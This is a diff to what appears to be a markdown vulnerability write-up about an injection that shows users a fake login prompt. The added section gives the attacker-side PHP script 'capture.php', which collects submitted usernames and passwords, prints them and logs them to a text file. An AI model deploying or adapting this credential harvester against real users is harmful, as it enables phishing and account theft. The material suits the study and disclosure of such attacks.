@@ -57,6 +57,32 @@ from the injected Payload it ask the user to enter the username and password
 ![5](https://github.com/user-attachments/assets/680fb121-c1f9-44f4-acd2-a7703e54d0e6)
 
 
+---
+
+from the Attackers side I created a custom PHP Script (capture.php) which grabs the cred from the user:
+```php
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = htmlspecialchars($_POST["username"]);
+    $password = htmlspecialchars($_POST["password"]);
+
+    // You can log this to a file instead of printing it
+    echo "<h2>Captured Credentials</h2>";
+    echo "Username: " . $username . "<br>";
+    echo "Password: " . $password . "<br>";
+
+    // Optionally write to file
+    $log = fopen("creds.txt", "a");
+    fwrite($log, "Username: $username | Password: $password\n");
+    fclose($log);
+}
+?>
+
+
+
+
+
+
 
 
 
